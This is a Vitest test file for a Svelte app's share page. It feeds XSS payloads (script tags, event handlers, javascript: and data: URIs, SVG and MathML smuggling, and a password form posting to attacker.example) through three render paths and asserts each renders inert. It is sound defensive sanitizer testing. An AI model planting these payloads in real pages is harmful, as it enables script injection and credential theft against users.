// TASK-3798 (the director's audit of #2145): real XSS payloads, pinned per
// share render path. The share page puts item bodies on Pad's origin for an
// anonymous viewer through three paths: the direct item share's marked
// pipeline, its fallback when rendering throws, and the collection share's
// inline expand (renderItemContent). Each path gets the same hostile body and
// must render it inert; each has a counterfactual that bypasses only it.
import { describe, it, expect, vi, afterEach } from 'vitest';
import { cleanup, fireEvent, render } from '@testing-library/svelte';

const share = vi.hoisted(() => ({ payload: null as unknown, throwRender: false }));

vi.mock('$lib/api/client', () => {
	class PadApiError extends Error {}
	return {
		PadApiError,
		api: { share: { get: vi.fn(async () => share.payload) } },
		withRequestDeadline: vi.fn(),
	};
});

vi.mock('$lib/utils/markdown', async (importOriginal) => {
	const real = await importOriginal<typeof import('$lib/utils/markdown')>();
	return {
		...real,
		renderMarkedWithAttachments: (...args: Parameters<typeof real.renderMarkedWithAttachments>) => {
			if (share.throwRender) throw new Error('forced: take the fallback path');
			return real.renderMarkedWithAttachments(...args);
		},
	};
});

import { page } from '$app/state';
import SharePage from './+page.svelte';

const SVG_DATA = 'data:image/svg+xml;base64,' + btoa('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>');
const HTML_DATA = 'data:text/html;base64,' + btoa('<script>alert(1)</script>');

// One payload per class the task names, each raw HTML or markdown an editor of
// a shared item could write. Each class is a test of its own on every path, so
// a sanitizer weakened for one class fails exactly that class.
const PAYLOADS: Record<string, string> = {
	script: '<script>window.__xss = "script"</script>',
	'event handler': '<img src="x" onerror="window.__xss = 1">\n\n<p onclick="window.__xss = 2" onmouseover="window.__xss = 3">Hover text.</p>',
	// The markdown link reaches the sanitizer as an anchor only on the marked
	// paths; the fallback sanitizes the raw text. The raw anchors below reach
	// every path.
	'javascript: href': [
		'[md js link](javascript:window.__xss=4)',
		'<a href="javascript:window.__xss=5">raw js link</a>',
		'<a href=" JaVaScRiPt:window.__xss=6">spaced js link</a>',
	].join('\n\n'),
	'svg with script or handlers': [
		'<svg><script>window.__xss = "svg-script"</script><circle onload="window.__xss = 7"/></svg>',
		'<svg onload="window.__xss = 8"><a xlink:href="javascript:window.__xss=9"><text>svg link</text></a></svg>',
	].join('\n\n'),
	'mathml smuggling': '<math><mtext><script>window.__xss = 10</script></mtext></math>',
	'data: uri': `<a href="${HTML_DATA}">data html link</a>\n\n<img src="${SVG_DATA}">`,
	'frame and plugin': `<iframe src="javascript:window.__xss=11" srcdoc="<script>window.__xss=12</script>"></iframe>\n\n<object data="${HTML_DATA}"></object><embed src="${HTML_DATA}">`,
	'style and svg reference': [
		'<p style="background:url(javascript:window.__xss=13)">Styled text.</p>',
		'<style>@import "https://attacker.example/x.css"; body{background:url(javascript:window.__xss=14)}</style>',
		`<svg><use href="${SVG_DATA}#x"></use></svg>`,
		'<link rel="stylesheet" href="https://attacker.example/x.css">',
	].join('\n\n'),
	'document control': [
		'<base href="https://attacker.example/">',
		'<meta http-equiv="refresh" content="0;url=javascript:window.__xss=15">',
		`<img src="x" srcset="javascript:window.__xss=16 1x, ${HTML_DATA} 2x">`,
	].join('\n\n'),
	'form': '<form action="https://attacker.example/collect"><input name="pw" type="password"><button>Go</button></form>',
};
const body = (payload: string) => `${payload}\n\nBody marker.`;

const URL_ATTRS = ['href', 'src', 'xlink:href', 'action', 'formaction', 'data', 'srcdoc', 'background', 'poster', 'content'];
// An image loaded through <img> runs no script, an SVG included (the HTML
// spec loads it in secure animated mode). DOMPurify keeps data: on image
// tags by design; only these types are accepted, and only on <img src>.
const INERT_IMAGE_DATA = /^data:image\/(png|jpeg|gif|webp|avif|svg\+xml)[;,]/i;
// The markdown allowlist permits neither attribute, so any occurrence is a
// regression, whatever it encodes (CSS escapes like u\\72l( included).
const FORBIDDEN_ATTRS = ['style', 'srcset'];
// A browser's URL parser drops ASCII tab, LF and CR anywhere in the URL, so
// "java\nscript:" is a javascript: URL. Strip them before testing the scheme.
const urlForScheme = (v: string) => v.replace(/[\t\n\r]/g, '');
const SCRIPT_URL = /^[\s\u0000-\u001f]*(javascript|vbscript|data):/i;

async function settle() {
	for (let i = 0; i < 20; i++) await Promise.resolve();
}

/** The rendered body is inert: nothing that runs script, by element, handler or URL. */
function expectInert(scope: Element) {
	// Found by TEXT, so an unrendered body fails here, not on a vacuous absence.
	expect(scope.textContent, 'the body did not render').toContain('Body marker.');
	for (const tag of ['script', 'iframe', 'object', 'embed', 'foreignObject', 'svg', 'math', 'form', 'base', 'meta', 'link', 'style', 'use']) {
		expect(scope.querySelectorAll(tag).length, `a <${tag}> reached the page`).toBe(0);
	}
	for (const el of scope.querySelectorAll('*')) {
		for (const attr of el.getAttributeNames()) {
			expect(attr.toLowerCase().startsWith('on'), `<${el.tagName.toLowerCase()}> kept the handler ${attr}`).toBe(false);
			if (URL_ATTRS.includes(attr.toLowerCase())) {
				const value = el.getAttribute(attr) ?? '';
				// An image's data: URI is inert: a browser runs no script in an SVG
				// loaded as an <img>. DOMPurify keeps data: on image tags by design.
				if (el.tagName === 'IMG' && attr === 'src' && INERT_IMAGE_DATA.test(urlForScheme(value))) continue;
				expect(SCRIPT_URL.test(urlForScheme(value)), `<${el.tagName.toLowerCase()} ${attr}="${value.slice(0, 40)}"> kept a script URL`).toBe(false);
			}
			expect(FORBIDDEN_ATTRS.includes(attr.toLowerCase()), `<${el.tagName.toLowerCase()}> kept a ${attr} attribute`).toBe(false);
		}
	}
	expect((window as unknown as { __xss?: unknown }).__xss, 'a payload ran').toBeUndefined();
}

async function renderItemShare(content: string) {
	page.params = { token: 'tok' };
	share.payload = { type: 'item', item: { title: 'Notes', ref: 'DOC-1', fields: {}, content } };
	const { container } = render(SharePage);
	await settle();
	return container;
}

afterEach(() => {
	cleanup();
	share.throwRender = false;
	delete (window as unknown as { __xss?: unknown }).__xss;
});

describe.each(Object.entries(PAYLOADS))('share page: the %s payload renders inert on every body path (TASK-3798)', (_name, payload) => {
	it('the item share: marked pipeline', async () => {
		expectInert(await renderItemShare(body(payload)));
	});

	it('the item share: fallback when rendering throws', async () => {
		share.throwRender = true;
		expectInert(await renderItemShare(body(payload)));
	});

	it('the collection share: inline expand', async () => {
		page.params = { token: 'tok' };
		// The view switcher mirrors its choice into the URL with
		// history.replaceState, which jsdom refuses for another origin.
		(page as unknown as { url: URL }).url = new URL(window.location.href);
		share.payload = {
			type: 'collection',
			collection: { name: 'Shared' },
			items: [{ ref: 'DOC-1', title: 'Hostile doc', content: body(payload) }],
		};
		const { container } = render(SharePage);
		await settle();
		const opener = container.querySelector('[aria-expanded]');
		expect(opener, 'the collection did not render an expandable item').not.toBeNull();
		await fireEvent.click(opener!);
		await settle();
		const panel = container.querySelector('.item-expansion');
		expect(panel, 'the item did not expand').not.toBeNull();
		expectInert(panel!);
	});
});

// The instrument, checked on its own: each rule above must fire on a node that
// breaks it. Some payload classes (<meta>, <base>) are dropped by more than one
// layer of the page, so a sanitizer mutant alone cannot show the check would
// catch them.
describe('expectInert fires on every rule it names (TASK-3798)', () => {
	const cases: Record<string, string> = {
		'<meta>': '<meta http-equiv="refresh" content="0;url=https://e/">',
		'<base>': '<base href="https://attacker.example/">',
		'<link>': '<link rel="stylesheet" href="https://e/x.css">',
		'<style>': '<style>p{}</style>',
		'<use>': '<svg><use href="#x"></use></svg>',
		'on* handler': '<p onclick="x()">t</p>',
		'javascript: href': '<a href="javascript:x()">t</a>',
		'data: on a link': `<a href="${HTML_DATA}">t</a>`,
		'data: non-image on img': `<img src="${HTML_DATA}">`,
		'srcset at all': '<img src="x" srcset="https://e/a.png 1x">',
		'style at all': '<p style="color:red">t</p>',
		'style with a CSS escape': '<p style="background:u\\72l(javascript:x())">t</p>',
		'javascript: split by a newline': '<a href="java&#x0A;script:x()">t</a>',
		'javascript: split by a tab': '<a href="java&#x09;script:x()">t</a>',
	};
	it.each(Object.entries(cases))('%s', (_name, html) => {
		const scope = document.createElement('div');
		scope.innerHTML = `${html}<p>Body marker.</p>`;
		expect(() => expectInert(scope)).toThrow();
	});

	it('control: a plain body passes', () => {
		const scope = document.createElement('div');
		scope.innerHTML = `<p><a href="https://getpad.dev">link</a></p><img src="${SVG_DATA}"><p>Body marker.</p>`;
		expect(() => expectInert(scope)).not.toThrow();
	});
});
